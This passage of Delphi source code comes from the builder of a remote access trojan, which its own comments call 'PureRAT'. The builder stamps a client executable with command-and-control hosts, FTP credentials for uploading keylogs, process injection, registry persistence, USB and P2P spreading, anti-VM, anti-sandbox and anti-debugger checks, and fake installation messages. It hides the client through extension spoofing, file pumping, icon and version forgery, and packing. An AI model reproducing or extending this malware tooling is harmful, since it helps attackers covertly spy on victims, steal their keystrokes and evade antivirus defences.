  advm1.Lines.Add(JustL('  Anti Virtuals machines', 40) + MyBoolToStr(chkVM.Checked));
  advm1.Lines.Add(JustL('  Anti Sandboxies', 40) + MyBoolToStr(chkSB.Checked));
  advm1.Lines.Add(JustL('  Anti Debuggers', 40) + MyBoolToStr(chkDG.Checked));
  advm1.Lines.Add(JustL('  Anti Process analysers', 40) + MyBoolToStr(chkPA.Checked));

  if (chkVM.Checked) or (chkSB.Checked) or (chkDG.Checked) or (chkPA.Checked) then
  begin
    if cbbTodo.ItemIndex = 0 then
      advm1.Lines.Add(JustL('  To do', 40) + 'Self delete')
    else advm1.Lines.Add(JustL('  To do', 40) + 'Stop process');
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Keylogger', 0));
  advm1.Lines.Add(JustL('  Send keylogs by FTP', 40) + MyBoolToStr(chkFtplogs.Checked));

  if chkFtplogs.Checked then
  begin
    advm1.Lines.Add(JustL('  Host', 40) + edtFtphost.Text);
    advm1.Lines.Add(JustL('  Port', 40) + seFtpPort.Text);
    advm1.Lines.Add(JustL('  Username', 40) + edtFtpUser.Text);
    advm1.Lines.Add(JustL('  Password', 40) + edtFtpPass.Text);
    advm1.Lines.Add(JustL('  Directory', 40) + edtFtpDir.Text);                
    advm1.Lines.Add(JustL('  Max logs size', 40) + se2.Text + ' KB');
    advm1.Lines.Add(JustL('  Send logs every', 40) + se1.Text + ' minutes');
  end;

  advm1.Lines.Add('');
  advm1.Lines.Add(JustL('Fake message', 0));
  advm1.Lines.Add(JustL('  Show a fake installation message', 40) + MyBoolToStr(chkFakemsg.Checked));
  if chkFakemsg.Checked then
  begin
    advm1.Lines.Add(JustL('  Message title', 40) + edtTitle.Text);
    advm1.Lines.Add(JustL('  Message text', 40) + redtBody.Text);
  end;
end;
  
procedure TFormBuilder.ListProfiles;
var
  SchRec: TSearchRec;
  pList: TListItem;
  pPath, TmpStr: string;
begin                                                 
  lv1.Clear;
  pPath := ExtractFilePath(ParamStr(0)) + 'Profiles';
  if not DirectoryExists(pPath) then CreateDir(pPath);

  if FindFirst(pPath + '\*.profile', faAnyFile, SchRec) <> 0 then Exit;
  repeat
    if (SchRec.Attr and faDirectory) <> faDirectory then
    begin
      TmpStr := SchRec.Name;
      TmpStr := Copy(TmpStr, 1, Pos('.', TmpStr) - 1);

      pList := lv1.Items.Add;
      pList.Caption := TmpStr;
      pList.ImageIndex := 0;
    end;
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

procedure TFormBuilder.SaveProfile(pName: string);
var
  TmpStr: string;
  JSONConfig: TJSONConfig;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Profiles';
  if not DirectoryExists(TmpStr) then CreateDir(TmpStr);
  TmpStr := TmpStr + '\' + pName + '.profile';

  JSONConfig := TJSONConfig.Create(TmpStr, PROGRAMPASSWORD);
  JSONConfig.WriteString('Group id', cbbGroup.Text + ':' + IntToStr(cbbIcon.ItemIndex));
  JSONConfig.WriteString('Client id', edtId.Text);
  JSONConfig.WriteString('Password', edtPassword.Text);
  JSONConfig.WriteInteger('Inject', cbbInjection.ItemIndex);
  JSONConfig.WriteString('Inject path', edtProcessname.Text);
  JSONConfig.WriteString('Connection host', GrabHostList);
  JSONConfig.WriteInteger('Connection delay', seDelay.Value);
  JSONConfig.WriteBool('Installation', chkInstall.Checked);
  JSONConfig.WriteInteger('Destination', cbbDestination.ItemIndex);
  JSONConfig.WriteString('Custom path', edtDestination.Text);
  JSONConfig.WriteString('Folder', edtFolder.Text);
  JSONConfig.WriteString('Filename', edtFilename.Text);
  JSONConfig.WriteBool('Melt', chkMelt.Checked);
  JSONConfig.WriteBool('Hide', chkHide.Checked);
  JSONConfig.WriteBool('Keylogger', chkKeylogger.Checked);
  JSONConfig.WriteBool('Reboot', chkReboot.Checked);
  JSONConfig.WriteBool('Persistence', chkPersistence.Checked);
  JSONConfig.WriteBool('Creation date', chkDate.Checked);
  JSONConfig.WriteBool('USB', chkUSB.Checked);
  JSONConfig.WriteBool('P2P', chkP2P.Checked);
  JSONConfig.WriteString('Spread filename1', edtSpreading.Text);
  JSONConfig.WriteString('Spread filename2', edt1.Text);
  JSONConfig.WriteBool('Registry startup', chkRegStartup.Checked);
  JSONConfig.WriteBool('HKCU', chkHKCU.Checked);
  JSONConfig.WriteBool('HKLM', chkHKLM.Checked);
  JSONConfig.WriteBool('Policies', chkPolicies.Checked);
  JSONConfig.WriteBool('RunOnce', chkRun.Checked);
  JSONConfig.WriteString('ActiveX', edtAX.Text);
  JSONConfig.WriteString('Key name', edtKeyname.Text);
  JSONConfig.WriteBool('Anti VM', chkVM.Checked);
  JSONConfig.WriteBool('Anti sandboxie', chkSB.Checked);
  JSONConfig.WriteBool('Anti debugger', chkDG.Checked);
  JSONConfig.WriteBool('Anti PA', chkPA.Checked);
  JSONConfig.WriteInteger('Anti Todo', cbbTodo.ItemIndex);
  JSONConfig.WriteBool('Fake message', chkFakemsg.Checked);
  JSONConfig.WriteString('Message title', edtTitle.Text);
  JSONConfig.WriteString('Message text', redtBody.Text);
  JSONConfig.WriteInteger('Message type', rgIcon.ItemIndex);
  JSONConfig.WriteInteger('Message buttons', rgButton.ItemIndex);
  JSONConfig.WriteBool('Keylogs upload', chkFtplogs.Checked);
  JSONConfig.WriteString('Ftp host', edtFtphost.Text);
  JSONConfig.WriteString('Ftp user', edtFtpUser.Text);
  JSONConfig.WriteString('Ftp pass', edtFtpPass.Text);
  JSONConfig.WriteString('Ftp directory', edtFtpDir.Text);
  JSONConfig.WriteInteger('Ftp port', seFtpPort.Value);
  JSONConfig.WriteInteger('Keylogs size', se2.Value);
  JSONConfig.WriteInteger('Keylogs delay', se1.Value);
  JSONConfig.WriteString('Windows filter', edtWindows.Text);
  JSONConfig.WriteInteger('Compression', rgCompression.ItemIndex);
  JSONConfig.WriteBool('Autosave', chk12.Checked);
  JSONConfig.SaveConfig;
  JSONConfig.Free;
end;

//From SpyNet-RAT
function RandomAX: string;
var
  b, x: Byte;
begin
  Result := '{';
  Randomize;

  for b := 1 to 8 do
  begin
    if Random(100) > 50 then Result := Result + Chr(RandomRange(48,57)) else
    Result := Result + Chr(RandomRange(65,90));
  end;

  Result := Result + '-';

  for x:= 1 to 3 do
  begin
    for b := 1 to 4 do
    begin
      if Random(100) < 50 then Result := Result + Chr(RandomRange(48,57)) else
      Result := Result + Chr(RandomRange(65,90));
    end;

    Result := Result + '-';
  end;

  for b := 1 to 12 do
  begin
    if Random(100) < 50 then Result := Result + Chr(RandomRange(48,57)) else
    Result := Result + Chr(RandomRange(65,90));
  end;

  Result := Result + '}';
end;

//Bytes array generator, by wrh1d3 :)
procedure GenerateBytesArray(Filename, s: string);
var
  Buffer: Byte;
  TmpStr, _f: string;
  F: file;
  FileSize: Int64;
  i: Integer;
  j: Cardinal;
begin
  FileMode := $0000;
  AssignFile(F, FormBuilder.ClientFile);
  Reset(F, 1);

  FileSize := MyGetFileSize(FormBuilder.ClientFile);
  _f := '';
  j := 0;
  i := 0;

  if s = 'h' then
  begin
    while not EOF(F) do
    begin
      BlockRead(F, Buffer, SizeOf(Buffer), j);
      if i <> 0 then _f := _f + ',';                        
      if (i mod 20) = 0 then _f := _f + #13#10 + '  ';
      _f := _f + Format('0x%.2X', [Buffer]);
      Inc(i);
    end;

    TmpStr := '//PureRAT client bytes array (C/C++)' + #13#10#13#10;
    TmpStr := TmpStr + '//Filename: ' + ExtractFileName(FormBuilder.ClientFile) + #13#10;
    TmpStr := TmpStr + '//File size: ' + FileSizeToStr(FileSize) + #13#10#13#10;
    TmpStr := TmpStr + '//Begin--' + #13#10;
    TmpStr := TmpStr + 'unsigned char BytesArray[' + IntToStr(FileSize) + '] {' + _f + '};' + #13#10;
    TmpStr := TmpStr + '//--End;' + #13#10;
  end
  else

  if s = 'pas' then
  begin
    while not EOF(F) do
    begin
      BlockRead(F, Buffer, SizeOf(Buffer), j);
      if i <> 0 then _f := _f + ',';
      if (i mod 20) = 0 then _f := _f + #13#10 + '    ';
      _f := _f + Format('$%.2X', [Buffer]);
      Inc(i);
    end;

    TmpStr := '//PureRAT client bytes array (Pascal)' + #13#10#13#10;
    TmpStr := TmpStr + '//Filename: ' + ExtractFileName(FormBuilder.ClientFile) + #13#10;
    TmpStr := TmpStr + '//File size: ' + FileSizeToStr(FileSize) + #13#10#13#10;
    TmpStr := TmpStr + 'unit BytesArray;' + #13#10#13#10;
    TmpStr := TmpStr + 'interface' + #13#10#13#10;
    TmpStr := TmpStr + '//Begin--' + #13#10;
    TmpStr := TmpStr + 'const' + #13#10;
    TmpStr := TmpStr + '  BytesArray: array[0..' + IntToStr(FileSize) + '] of Byte = (' + _f + ');' + #13#10;
    TmpStr := TmpStr + '//--End;' + #13#10+#13#10;
    TmpStr := TmpStr + 'implementation' + #13#10#13#10;
    TmpStr := TmpStr + 'end.' + #13#10;
  end
  else

  if s = 'inc' then
  begin
    while not EOF(F) do
    begin
      BlockRead(F, Buffer, SizeOf(Buffer), j);
      if i <> 0 then _f := _f + ',';
      if (i mod 20) = 0 then _f := _f + #13#10 + '  ';
      _f := _f + Format('(byte) 0x%.2X', [Buffer]);
      Inc(i);
    end;

    TmpStr := '//PureRAT client bytes array (Java)' + #13#10#13#10;
    TmpStr := TmpStr + '//Filename: ' + ExtractFileName(FormBuilder.ClientFile) + #13#10;
    TmpStr := TmpStr + '//File size: ' + FileSizeToStr(FileSize) + #13#10#13#10;
    TmpStr := TmpStr + '//Begin--' + #13#10;
    TmpStr := TmpStr + 'byte BytesArray[] = new byte [] {' + _f + '};' + #13#10;
    TmpStr := TmpStr + '//--End;' + #13#10;
  end
  else

  if s = 'py' then
  begin         
    while not EOF(F) do
    begin
      BlockRead(F, Buffer, SizeOf(Buffer), j);
      if i <> 0 then 
      if (i mod 20) = 0 then _f := _f + '''' + ' + \' + #13#10 + '  ' + '''';
      _f := _f + Format('\x%.2X', [Buffer]);
      Inc(i);
    end;

    TmpStr := '#PureRAT client bytes array (Python)' + #13#10#13#10;
    TmpStr := TmpStr + '#Filename: ' + ExtractFileName(FormBuilder.ClientFile) + #13#10;
    TmpStr := TmpStr + '#File size: ' + FileSizeToStr(FileSize) + #13#10#13#10;
    TmpStr := TmpStr + '#Begin--' + #13#10;
    TmpStr := TmpStr + 'BytesArray = ' + #13#10 + '  ' + '''' + _f + '''' + #13#10;
    TmpStr := TmpStr + '#--End;' + #13#10;
  end;

  CloseFile(F);
  MyCreateFile(Filename, TmpStr, Length(TmpStr));

  while not FileExists(Filename) do Sleep(1);
  FormBuilder.AddLog('Done -> final size: ' + FileSizeToStr(MyGetFileSize(FileName)), clGreen);
end;

procedure BuilderThread(p: Pointer); stdcall;
var
  TmpRes: TResourceStream;
  FileStream: TFileStream;
  Stream: TMemoryStream;
  Buffer, ClientBuffer,
  StubBuffer, StubFile,
  TmpStr, TmpStr1,
  VerPatchFile: string;
  TmpBool: Boolean;
  bBuffer: array of Byte;
  BufferSize: Cardinal;
  i, j: Integer;
begin
  with FormBuilder do
  begin
    pnlLogs.BringToFront;
    lvLogs.Clear;
    pb1.Position := 0;
    btn5.Enabled := False;
    EnableCloseButtton := False;    

    AddLog('Loading client buffer...');

    TmpRes := TResourceStream.Create(HInstance, 'CLIENT', 'clientfile');
    TmpRes.Position := 0;
    BufferSize := TmpRes.Size;
    TmpRes.SaveToFile(ClientFile);
    TmpRes.Free;

    AddLog('Client buffer of size ' + FileSizeToStr(BufferSize) + ' loaded', clGreen);
    pb1.Position := 20;

    ProfileConfig := '';

    for i := 0 to 4 do
    ProfileConfig := ProfileConfig + PClientConfiguration(p)^.Hosts[i] + '#';
    ProfileConfig := ProfileConfig + '|';

    for i := 0 to 4 do
    ProfileConfig := ProfileConfig + IntToStr(PClientConfiguration(p)^.Ports[i]) + '#';
    ProfileConfig := ProfileConfig + '|';

    for i := 0 to 3 do
    ProfileConfig := ProfileConfig + PClientConfiguration(p)^.FTPOptions[i] + '#';
    ProfileConfig := ProfileConfig + '|';

    for i := 0 to 3 do
    ProfileConfig := ProfileConfig + PClientConfiguration(p)^.MessageParams[i] + '#';
    ProfileConfig := ProfileConfig + '|';

    ProfileConfig := ProfileConfig + IntToStr(PClientConfiguration(p)^.Delay) + '|' +
                     IntToStr(PClientConfiguration(p)^.FTPPort) + '|' +
                     IntToStr(PClientConfiguration(p)^.FTPDelay) + '|' +
                     IntToStr(PClientConfiguration(p)^.KeylogSize) + '|' +
                     PClientConfiguration(p)^.GroupId + '|' +
                     PClientConfiguration(p)^.ClientId + '|' +
                     PClientConfiguration(p)^.StartupKey + '|' +
                     PClientConfiguration(p)^.Password + '|' +
                     PClientConfiguration(p)^.MutexName + '|' +
                     PClientConfiguration(p)^.Foldername + '|' +
                     PClientConfiguration(p)^.FileName + '|' +
                     PClientConfiguration(p)^.Destination + '|' +
                     PClientConfiguration(p)^.InjectInto + '|' +
                     PClientConfiguration(p)^.ActiveX + '|' +
                     PClientConfiguration(p)^.SpreadAs + '|' +
                     PClientConfiguration(p)^.P2PNames + '|' +
                     PClientConfiguration(p)^.Windows + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.FakeMessage) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Install) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Keylogger) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Melt) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Startup) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Hide) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.WaitReboot) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.ChangeDate) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.HKCUStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.HKLMStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.PoliciesStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.RunOnceStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Persistence) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.FTPLogs) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.USB) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.P2P) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.AntiVM) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.AntiSB) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.AntiDG) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.AntiPA) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.Screenlogger) + '|' +
                     MyBoolToStr(PClientConfiguration(p)^.AntiRemove) + '|' +
                     PClientConfiguration(p)^.PluginUrl + '|' + RandomAX + '|';

    ProfileConfig := EnDecryptText(ProfileConfig, PROGRAMPASSWORD);
    AddLog('Writting profile configuration of size ' + FileSizeToStr(Length(ProfileConfig)) + ' to client...');

    if WriteResData(ClientFile, @ProfileConfig[1], Length(ProfileConfig), 'CFG') = False then
    begin
      AddLog('Failed to write profile configuration', clRed);
      pb1.Position := 0;
      btn5.Enabled := True;
      EnableCloseButtton := True;
      DeleteFile(ClientFile);
      Exit;
    end;

    AddLog('Profile configuration successfully written', clGreen);
    pb1.Position := 40;

    if lvPlugin.Items.Count > 0 then
    begin
      TmpStr := '';
      AddLog('Writing plugins buffer to client...');

      for i := 0 to lvPlugin.Items.Count -1 do
      begin
        TmpStr := TmpStr + MyBoolToStr(TFileOptions(lvPlugin.Items.Item[i].Data).Execute) + '|' +
          IntToStr(MyGetFileSize(lvPlugin.Items.Item[i].Caption)) + '|' +
          FileToStr(lvPlugin.Items.Item[i].Caption);
      end;                                                           

      if WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'PLGS') then
        AddLog('Plugins buffer of size ' + FileSizeToStr(Length(TmpStr)) + ' successfully written', clGreen)
      else AddLog('Failed to wtite plugins buffer', clRed);
    end;

    pb1.Position := 50;

    if chkIcon.Checked then
    begin
      AddLog('Changing client icon file...');

      IconPath := edtIconPath.Text;
      if not FileExists(IconPath) then
        AddLog('Failed to change icon file, file ' + IconPath + ' not found', clRed)
      else
      begin
        UpdateExeIcon(PChar(ClientFile), 'MAINICON', PChar(IconPath));
        UpdateExeIcon(PChar(ClientFile), 'ICON_STANDARD', PChar(IconPath));
        if UpdateApplicationIcon(PChar(IconPath), PChar(ClientFile)) = False then
        AddLog('Failed to update icon file', clRed);
      end;

      AddLog('Icon file successfully changed by ' + IconPath, clGreen);
    end;

    pb1.Position := 60;

    if chkAsm.Checked then
    begin
      AddLog('Writting client assembly informations...');

      VerPatchFile := ExtractFilePath(ParamStr(0)) + 'Resources\verpatch\verpatch.exe';
      if not FileExists(VerPatchFile) then
        AddLog('Failed to write assembly informations, file ' + VerPatchFile + ' not found', clRed)
      else
      begin
        ExecAndWait('"' + VerPatchFile + '" "' + ClientFile + '" /va ' +
          edtFVer.Text + ' /pv ' + edtPVer.Text + ' /s company "' +
          edtComp.Text + '" /s description "' + edtDesc.Text + '" ' + '/s title "' +
          edtName.Text + '" /s copyright "' + edtCopy.Text + '" ' + '/s tm "' +
          edtTrade.Text + '" /s product "' + edtPName.Text + '" /s private "' +
          edtPBuild.Text + '" /s build "' + edtSBuild.Text + '"');
      end;

      AddLog('Assembly informations successfully written', clGreen);
    end;

    //Remove these shits inside RT_RCDATA _nTn_
    MyDeleteResources(ClientFile);

    pb1.Position := 70;

    //Thanks to Doddy Hackman (DHRAT 2.0) for the file pumping function...
    if chkPump.Checked then
    begin
      if (edtPump.Text <> '') and (cbbPump.ItemIndex <> -1) then
      begin
        AddLog('Pumping client file with extras datas...');

        case cbbPump.ItemIndex of
          0: BufferSize := StrToInt(edtPump.Text);
          1: BufferSize := StrToInt(edtPump.Text) * 1024;
          2: BufferSize := StrToInt(edtPump.Text) * 1048576;
        end;

        SetLength(bBuffer, BufferSize);
        ZeroMemory(@bBuffer[0], BufferSize); //instead of ZeroMemory(@bBuffer[0], SizeOf(bBuffer));

        //and i've change pumping method
        Stream := TMemoryStream.Create;
        Stream.Write(bBuffer[0], BufferSize);
        Stream.Position := 0;

        FileStream := TFileStream.Create(ClientFile, fmOpenReadWrite);
        FileStream.Position := FileStream.Size;
        FileStream.CopyFrom(Stream, Stream.Size);
        FileStream.Free;
        Stream.Free;

        AddLog('Client file successfully pumped with ' + FileSizeToStr(BufferSize) + ' of extras datas', clGreen);
      end;
    end;

    pb1.Position := 80;

    //and extension spoofing, modified by wrh1d3 :) 
    if chkSpoof.Checked then
    begin
      if cbbSpoof.Text <> '' then
      begin
        AddLog('Spoofing client file extension...');
        TmpStr := ExtractFileName(ClientFile);
        TmpStr := Copy(TmpStr, 1, Pos('.', TmpStr) - 1);
        TmpStr := TmpStr + '.' + ReverseString(cbbSpoof.Text) + '.exe';
        RenameFile(ClientFile, ExtractFilePath(ClientFile) + TmpStr);
        AddLog('Client file extension successfully spoofed by .' + cbbSpoof.Text, clGreen);
      end;
    end;

    pb1.Position := 90;

    case rgCompression.ItemIndex of
      0:  begin
            AddLog('Packing client file...');
            TmpStr := ExtractFilePath(ParamStr(0)) + 'Resources\upx\upx.exe';
            if not FileExists(TmpStr) then AddLog('Packer file "' + TmpStr + '" not found', clRed) else
            ExecAndWait('"' + TmpStr + '" -9 -f "' + ClientFile + '"');
          end;
      1:  begin
            AddLog('Packing client file...');
            TmpStr := ExtractFilePath(ParamStr(0)) + 'Resources\mpress\mpress.exe';
            if not FileExists(TmpStr) then AddLog('Packer file "' + TmpStr + '" not found', clRed) else
            ExecAndWait('"' + TmpStr + '" -ms "' + ClientFile + '"');
          end;
    end;

    pb1.Position := 100;
    btn5.Enabled := True;
    EnableCloseButtton := True;

    AddLog('Done -> final size: ' + FileSizeToStr(MyGetFileSize(ClientFile)) +
      ' (MD5: ' + GetMD5(ClientFile) + ')', clGreen);
    if chk12.Checked then SaveProfile(ProfileName);
  end;
end;

function RandomId: string;
const
  TmpStr = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
var
  i: Integer;
begin
  Randomize;
  for i := 0 to 6 do Result := Result + TmpStr[Random(Length(TmpStr)) + 1];
end;

procedure TFormBuilder.btn5Click(Sender: TObject);
var
  TmpStr: string;
  i: Integer;
begin
  i := cbbIcon.ItemIndex;
  if i = -1 then i := 0;

  if cbbGroup.Text <> '' then
    ClientConfiguration.GroupId := cbbGroup.Text + ':' + cbbIcon.Items.Strings[i]
  else
  begin
    MessageBox(Handle, 'Invalid group id.', PROGRAMINFOS, MB_ICONERROR);
    pnlMain.BringToFront;
    cbbGroup.SetFocus;
    Exit;
  end;

  if edtId.Text <> '' then
  begin
    TmpStr := edtId.Text;
    TmpStr := MyReplaceStr(TmpStr, '%RANDOMID%', RandomId);
    ClientConfiguration.ClientId :=  TmpStr + ':' + cbbIcon.Items.Strings[i];
  end
  else
  begin
    MessageBox(Handle, 'Invalid client id.', PROGRAMINFOS, MB_ICONERROR);
    pnlMain.BringToFront;
    edtId.SetFocus;
    Exit;
  end;

  ClientConfiguration.Password := edtPassword.Text;

  if edtProcessname.Text <> '' then ClientConfiguration.InjectInto := edtProcessname.Text else
  begin
    MessageBox(Handle, 'Invalid process name.', PROGRAMINFOS, MB_ICONERROR);
    pnlMain.BringToFront;
    edtProcessname.SetFocus;
    Exit;
  end;

  ClientConfiguration.MutexName := edtMutex.Text;

  if lv2.Items.Count > 0 then          
  begin
    for i := 0 to lv2.Items.Count - 1 do
    begin
      ClientConfiguration.Hosts[i] := lv2.Items[i].Caption;
      ClientConfiguration.Ports[i] := StrToIntDef(lv2.Items[i].SubItems[0], 0);
    end;

    ClientConfiguration.Delay := seDelay.Value;
  end
  else
  begin
    MessageBox(Handle, 'Invalid host and port.', PROGRAMINFOS, MB_ICONERROR);
    pnlNetwork.BringToFront;
    lv2.SetFocus;
    Exit;
  end;

  if rb1.Checked then ClientConfiguration.PluginUrl := '' else
  if rb2.Checked then
  begin
    if edtPluginUrl.Text <> '' then ClientConfiguration.PluginUrl := edtPluginUrl.Text else
    begin
      MessageBox(Handle, 'Invalid url link.', PROGRAMINFOS, MB_ICONERROR);
      pnlNetwork.BringToFront;
      edtPluginUrl.SetFocus;
      Exit;
    end;
  end;

  ClientConfiguration.Install := chkInstall.Checked;
  if ClientConfiguration.Install then
  begin
    if edtDestination.Text <> '' then ClientConfiguration.Destination := edtDestination.Text else
    begin
      MessageBox(Handle, 'Invalid destination path.', PROGRAMINFOS, MB_ICONERROR);
      pnlInstallation.BringToFront;
      edtDestination.SetFocus;
      Exit;
    end;

    if edtFolder.Text <> '' then ClientConfiguration.Foldername := edtFolder.Text else
    begin
      MessageBox(Handle, 'Invalid foldername.', PROGRAMINFOS, MB_ICONERROR);
      pnlInstallation.BringToFront;
      edtFolder.SetFocus;
      Exit;
    end;

    if edtFilename.Text <> '' then ClientConfiguration.FileName := edtFilename.Text + '.exe' else
    begin
      MessageBox(Handle, 'Invalid filename.', PROGRAMINFOS, MB_ICONERROR);
      pnlInstallation.BringToFront;
      edtFilename.SetFocus;
      Exit;
    end;

    ClientConfiguration.Melt := chkMelt.Checked;
    ClientConfiguration.ChangeDate := chkDate.Checked;
    ClientConfiguration.Hide := chkHide.Checked;
    ClientConfiguration.Keylogger := chkKeylogger.Checked;
    ClientConfiguration.Screenlogger := chkScrlogger.Checked;
    ClientConfiguration.WaitReboot := chkReboot.Checked;
    ClientConfiguration.Persistence := chkPersistence.Checked;

    if chkUSB.Checked then
    begin
      ClientConfiguration.USB := chkUSB.Checked;

      if edtSpreading.Text <> '' then ClientConfiguration.SpreadAs := edtSpreading.Text + '.exe' else
      begin
        MessageBox(Handle, 'Invalid USB spreading filename.', PROGRAMINFOS, MB_ICONERROR);
        pnlInstallation.BringToFront;
        edtSpreading.SetFocus;
        Exit;
      end;
    end;

    if chkP2P.Checked then
    begin
      ClientConfiguration.P2P := chkP2P.Checked;

      if (edt1.Text <> '') and (Pos(',', edt1.Text) > 0) then
      begin
        ClientConfiguration.P2PNames := edt1.Text;
        if ClientConfiguration.P2PNames[Length(ClientConfiguration.P2PNames)] <> ',' then
          ClientConfiguration.P2PNames := ClientConfiguration.P2PNames + ',';
      end
      else
      begin
        MessageBox(Handle, 'Invalid P2P spreading filenames.', PROGRAMINFOS, MB_ICONERROR);
        pnlInstallation.BringToFront;
        edt1.SetFocus;
        Exit;
      end;
    end;
  end;

  ClientConfiguration.Startup := chkRegStartup.Checked;
  if ClientConfiguration.Startup = True then
  begin
    ClientConfiguration.HKCUStartup := chkHKCU.Checked;
    ClientConfiguration.HKLMStartup := chkHKLM.Checked;
    ClientConfiguration.PoliciesStartup := chkPolicies.Checked;
    ClientConfiguration.RunOnceStartup := chkRun.Checked;
    ClientConfiguration.ActiveX := edtAX.Text;

    if edtKeyname.Text <> '' then ClientConfiguration.StartupKey := edtKeyname.Text else
    begin
      MessageBox(Handle, 'Invalid startup key name.', PROGRAMINFOS, MB_ICONERROR);
      pnlStartup.BringToFront;
      edtKeyname.SetFocus;
      Exit;
    end;
  end;

  ClientConfiguration.AntiVM := chkVM.Checked;
  ClientConfiguration.AntiDG := chkDG.Checked;
  ClientConfiguration.AntiSB := chkSB.Checked;
  ClientConfiguration.AntiPA := chkPA.Checked;

  if (chkVM.Checked) or (chkSB.Checked) or (chkDG.Checked) or (chkPA.Checked) then
  if cbbTodo.ItemIndex = -1 then
  begin
    MessageBox(Handle, 'Invalid protection action.', PROGRAMINFOS, MB_ICONERROR);
    pnlProtection.BringToFront;
    cbbTodo.SetFocus;
    Exit;
  end;

  ClientConfiguration.AntiRemove := cbbTodo.ItemIndex = 0;

  ClientConfiguration.FakeMessage := chkFakemsg.Checked;
  if ClientConfiguration.FakeMessage then
  begin
    if edtTitle.Text <> '' then ClientConfiguration.MessageParams[0] := edtTitle.Text else
    begin
      MessageBox(Handle, 'Invalid message title.', PROGRAMINFOS, MB_ICONERROR);
      pnlMessage.BringToFront;
      edtTitle.SetFocus;
      Exit;
    end;

    if redtBody.Text <> '' then ClientConfiguration.MessageParams[1] := redtBody.Text else
    begin
      MessageBox(Handle, 'Invalid message text.', PROGRAMINFOS, MB_ICONERROR);
      pnlMessage.BringToFront;
      redtBody.SetFocus;
      Exit;
    end;

    ClientConfiguration.MessageParams[2] := IntToStr(rgIcon.ItemIndex);
    ClientConfiguration.MessageParams[3] := IntToStr(rgButton.ItemIndex);
  end;

  ClientConfiguration.FTPLogs := chkFtplogs.Checked;
  if ClientConfiguration.FTPLogs = True then
  begin
    if (edtFtphost.Text = '') or (edtFtpUser.Text = '') or (edtFtpPass.Text = '') or
      (edtFtpDir.Text = '')
    then
    begin
      MessageBox(Handle, 'One or more entries are empty.', PROGRAMINFOS, MB_ICONERROR);
      pnlKeylogger.BringToFront;
      Exit;
    end;

    ClientConfiguration.FTPOptions[0] := edtFtphost.Text;
    ClientConfiguration.FTPOptions[1] := edtFtpUser.Text;
    ClientConfiguration.FTPOptions[2] := edtFtpDir.Text;
    ClientConfiguration.FTPOptions[3] := edtFtpPass.Text;
    ClientConfiguration.FTPPort := seFtpPort.Value;    
    ClientConfiguration.KeylogSize := se2.Value;
    ClientConfiguration.FTPDelay := se1.Value;
  end;

  ClientConfiguration.Windows := edtWindows.Text;

  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgSave1.Filter := '(*.exe)|*.exe';
  dlgSave1.DefaultExt := 'exe';
  dlgSave1.FileName := ExtractFilePath(ParamStr(0)) + 'Client.exe';
  if (not dlgSave1.Execute) or (dlgSave1.FileName = '') then Exit;
  ClientFile := dlgSave1.FileName;
  MyStartThread(@BuilderThread, @ClientConfiguration);
end;

procedure TFormBuilder.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
  CanClose := EnableCloseButtton;
end;
       
procedure TFormBuilder.FormCreate(Sender: TObject);
var
  JSONConfig: TJSONConfig;
  i: Integer;
begin
  //Load windows position settings
  JSONConfig := TJSONConfig.Create(WindowsSettings, PROGRAMPASSWORD);
  JSONConfig.LoadConfig;
  i := JSONConfig.ReadInteger('cBuilder left');
  if i <= 0 then Left := (Screen.Width - Width) div 2 else Left := i;
  i := JSONConfig.ReadInteger('cBuilder top');
  if i <= 0 then Top := (Screen.Height - Height) div 2 else Top := i;
  JSONConfig.Free;

  ListProfiles;
  ProfileName := '';
  EnableCloseButtton := True;
  pnlProfile.BringToFront;
end;

procedure TFormBuilder.btn7Click(Sender: TObject);
begin
  if chkAX.Checked = False then Exit;
  edtAX.Text := RandomAX;
end;

procedure TFormBuilder.chkAXClick(Sender: TObject);
begin
  if chkAX.Checked then btn7.Click else edtAX.Clear;
end;

procedure TFormBuilder.chkUSBClick(Sender: TObject);
begin
  if chkInstall.Checked = False then Exit;
  grpSpreading.Visible := chkUSB.Checked;
end;

procedure TFormBuilder.chkP2PClick(Sender: TObject);
begin
  if chkInstall.Checked = False then Exit;
  grp1.Visible := chkP2P.Checked;
end;

procedure TFormBuilder.chkSpoofClick(Sender: TObject);
begin
  grpSpoof.Visible := chkSpoof.Checked;
end;

procedure TFormBuilder.chkPumpClick(Sender: TObject);
begin
  grpPump.Visible := chkPump.Checked;
end;

procedure TFormBuilder.chkIconClick(Sender: TObject);
begin
  grp4.Visible := chkIcon.Checked;
end;

procedure TFormBuilder.lv1SelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
var
  TmpStr: string;
  JSONConfig: TJSONConfig;
begin
  if not Selected then
  begin
    advm1.Lines.Clear;
    Exit;
  end;

  TmpStr := ExtractFilePath(ParamStr(0)) + 'Profiles\' + Item.Caption + '.profile';
  if not FileExists(TmpStr) then
  begin
    Item.Delete;
